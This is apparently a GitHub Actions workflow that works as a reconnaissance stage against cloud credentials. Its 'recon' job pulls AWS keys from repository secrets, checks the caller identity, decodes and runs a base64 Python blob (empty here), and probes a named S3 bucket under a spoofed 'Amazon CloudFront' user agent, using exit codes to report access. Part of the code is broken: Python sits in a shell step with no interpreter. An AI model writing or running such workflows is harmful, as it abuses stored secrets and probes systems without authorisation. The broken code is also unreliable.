name: Stage2
on:
  push:
    branches: [corgi]

permissions:
  contents: read

jobs:
  recon:
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      AWS_DEFAULT_REGION: us-east-1
    steps:
      - name: Who am I
        run: aws sts get-caller-identity
        
      - name: Test write logad
        run: |
          pip install requests requests-aws4auth --quiet
          B64=''
          printf '%s' "$B64" | base64 -d > /tmp/t1.py && python3 /tmp/t1.py

      - name: Classify Lambda S3 error
        run: |
          pip install requests requests-aws4auth --quiet
      
          import boto3
          from botocore.config import Config
          from botocore.exceptions import (
              ClientError,
              EndpointConnectionError,
              NoCredentialsError,
              BotoCoreError,
          )
          
          try:
              s3 = boto3.client(
                  "s3",
                  region_name="us-east-1",
                  config=Config(user_agent="Amazon CloudFront"),
              )
          
              s3.list_objects_v2(
                  Bucket="userad88e2b168aa387e",
                  MaxKeys=1,
              )
          
              raise SystemExit(7)
          
          except ClientError as e:
              code = e.response.get("Error", {}).get("Code", "")
              raise SystemExit({
                  "AccessDenied": 10,
                  "AllAccessDisabled": 11,
                  "NoSuchBucket": 12,
              }.get(code, 13))
          
          except EndpointConnectionError:
              raise SystemExit(15)
          
          except NoCredentialsError:
              raise SystemExit(16)
          
          except BotoCoreError:
              raise SystemExit(17)
          
          except Exception:
              raise SystemExit(14)
